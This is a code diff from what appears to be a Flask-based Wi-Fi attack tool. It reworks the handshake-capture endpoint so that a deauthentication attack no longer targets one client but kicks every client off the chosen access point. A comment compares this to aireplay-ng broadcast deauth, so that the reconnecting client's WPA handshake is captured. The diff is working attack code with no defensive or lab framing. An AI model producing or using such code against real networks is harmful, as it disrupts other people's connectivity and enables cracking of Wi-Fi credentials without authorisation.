@@ -192,23 +192,25 @@ def start_handshake():
 
     payload = request.get_json(force=True, silent=True) or {}
     bssid = payload.get('bssid')
-    client_mac = payload.get('client_mac')
     deauth_count = int(payload.get('deauth_count', Config.HANDSHAKE_DEAUTH_COUNT))
     timeout = float(payload.get('timeout', Config.HANDSHAKE_TIMEOUT))
 
-    if not bssid or not client_mac:
-        return jsonify({"error": "bssid and client_mac are required"}), 400
+    if not bssid:
+        return jsonify({"error": "bssid is required"}), 400
 
-    handshake_capture.start_session(bssid, client_mac, timeout=timeout)
+    handshake_capture.start_session(bssid, timeout=timeout)
 
     def trigger_deauth():
         try:
-            deauth_attacker.send_deauth(bssid, client_mac, count=deauth_count)
+            # Broadcast: kick every currently connected client at once, like
+            # `aireplay-ng --deauth -a <bssid>` with no -c - whoever
+            # reconnects first gets caught by the capture session above.
+            deauth_attacker.send_deauth(bssid, client_mac=None, count=deauth_count)
         except Exception as e:
             print(f"⚠️  Deauth during handshake capture failed: {e}")
 
     threading.Thread(target=trigger_deauth, daemon=True).start()
-    return jsonify({"status": "started", "bssid": bssid, "client_mac": client_mac, "timeout": timeout})
+    return jsonify({"status": "started", "bssid": bssid, "timeout": timeout})
 
 
 @app.route('/api/handshake/download/<filename>')
